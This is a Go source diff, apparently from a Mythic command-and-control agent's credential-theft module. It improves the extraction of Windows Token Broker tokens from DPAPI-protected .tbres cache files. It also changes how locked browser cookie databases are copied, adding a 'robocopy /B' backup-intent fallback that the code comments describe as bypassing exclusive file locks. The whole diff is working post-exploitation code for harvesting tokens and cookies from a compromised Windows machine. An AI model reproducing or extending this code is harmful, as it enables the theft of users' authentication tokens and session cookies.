@@ -83,11 +83,27 @@ func credTokenBroker(sb *strings.Builder) []structs.MythicCredential {
 	tokenCount := 0
 	skippedCount := 0 // non-TokenResponse or no ResponseBytes
 	errorCount := 0
+	// Track error categories for diagnostics
+	errCategories := map[string]int{}
 
 	for _, f := range files {
 		tokens, parseErr := parseTbresFile(f)
 		if parseErr != nil {
 			errorCount++
+			// Categorize the error
+			errMsg := parseErr.Error()
+			switch {
+			case strings.HasPrefix(errMsg, "UTF-16"):
+				errCategories["utf16"]++
+			case strings.HasPrefix(errMsg, "JSON"):
+				errCategories["json"]++
+			case strings.HasPrefix(errMsg, "DPAPI"):
+				errCategories["dpapi"]++
+			case strings.HasPrefix(errMsg, "base64"):
+				errCategories["base64"]++
+			default:
+				errCategories["other"]++
+			}
 			continue
 		}
 		if tokens == nil {
@@ -144,7 +160,13 @@ func credTokenBroker(sb *strings.Builder) []structs.MythicCredential {
 		}
 	}
 
-	sb.WriteString(fmt.Sprintf("  Extracted %d tokens (%d metadata/skipped, %d errors)\n\n", tokenCount, skippedCount, errorCount))
+	sb.WriteString(fmt.Sprintf("  Extracted %d tokens (%d metadata/skipped, %d errors)\n", tokenCount, skippedCount, errorCount))
+	if errorCount > 0 {
+		for cat, count := range errCategories {
+			sb.WriteString(fmt.Sprintf("    %s: %d\n", cat, count))
+		}
+	}
+	sb.WriteString("\n")
 	return creds
 }
 
@@ -387,49 +409,62 @@ func extractProfileCookies(sb *strings.Builder, appName, profile, cookiesPath st
 	return creds
 }
 
-// openDBViaCmdCopy tries to open a locked SQLite DB by copying with cmd /c copy.
-// This uses a different code path than Go's CreateFileW and can sometimes bypass locks.
+// openDBViaCmdCopy tries to open a locked SQLite DB using multiple copy strategies.
 // Also copies WAL/SHM journals for WAL-mode databases.
 func openDBViaCmdCopy(dbPath string) (*sql.DB, func(), error) {
-	tf, err := os.CreateTemp("", "ewcookies-*.db")
+	// Create a temp directory — robocopy preserves original filenames
+	tmpDir, err := os.MkdirTemp("", "ewcookies-*")
 	if err != nil {
 		return nil, func() {}, err
 	}
-	tmpFile := tf.Name()
-	tf.Close()
 
-	_, cmdErr := execCmdTimeout("cmd", "/c", "copy", "/y", dbPath, tmpFile)
-	if cmdErr != nil {
-		secureRemove(tmpFile)
-		return nil, func() {}, fmt.Errorf("DB locked by process (copy failed: %v)", cmdErr)
+	srcDir := filepath.Dir(dbPath)
+	srcFile := filepath.Base(dbPath)
+	tmpFile := filepath.Join(tmpDir, srcFile)
+
+	// Try copy strategies for the main DB file
+	copied := false
+
+	// Strategy 1: cmd /c copy
+	if _, cmdErr := execCmdTimeout("cmd", "/c", "copy", "/y", dbPath, tmpFile); cmdErr == nil {
+		copied = true
 	}
 
-	// Also copy WAL and SHM journals if they exist — required for WAL-mode databases
-	execCmdTimeout("cmd", "/c", "copy", "/y", dbPath+"-wal", tmpFile+"-wal") //nolint:errcheck
-	execCmdTimeout("cmd", "/c", "copy", "/y", dbPath+"-shm", tmpFile+"-shm") //nolint:errcheck
+	// Strategy 2: robocopy /B (backup-intent mode — can bypass exclusive locks)
+	// robocopy exit codes: 0=no files, 1=files copied, 2+=errors/extras
+	if !copied {
+		execCmdTimeout("robocopy", "/B", srcDir, tmpDir, srcFile) //nolint:errcheck
+		if _, statErr := os.Stat(tmpFile); statErr == nil {
+			copied = true
+		}
+	}
+
+	if !copied {
+		os.RemoveAll(tmpDir) //nolint:errcheck
+		return nil, func() {}, fmt.Errorf("DB locked by process (all copy strategies failed)")
+	}
+
+	// Also copy WAL and SHM journals if they exist
+	for _, ext := range []string{"-wal", "-shm"} {
+		execCmdTimeout("cmd", "/c", "copy", "/y", dbPath+ext, filepath.Join(tmpDir, srcFile+ext)) //nolint:errcheck
+	}
 
 	db, err := sql.Open("sqlite", tmpFile)
 	if err != nil {
-		secureRemove(tmpFile)
-		secureRemove(tmpFile + "-wal")
-		secureRemove(tmpFile + "-shm")
+		os.RemoveAll(tmpDir) //nolint:errcheck
 		return nil, func() {}, err
 	}
 
 	// Verify the DB is actually usable
 	if pingErr := db.Ping(); pingErr != nil {
 		db.Close()
-		secureRemove(tmpFile)
-		secureRemove(tmpFile + "-wal")
-		secureRemove(tmpFile + "-shm")
+		os.RemoveAll(tmpDir) //nolint:errcheck
 		return nil, func() {}, fmt.Errorf("DB copy unusable: %w", pingErr)
 	}
 
 	cleanup := func() {
 		db.Close()
-		secureRemove(tmpFile)
-		secureRemove(tmpFile + "-wal")
-		secureRemove(tmpFile + "-shm")
+		os.RemoveAll(tmpDir) //nolint:errcheck
 	}
 	return db, cleanup, nil
 }
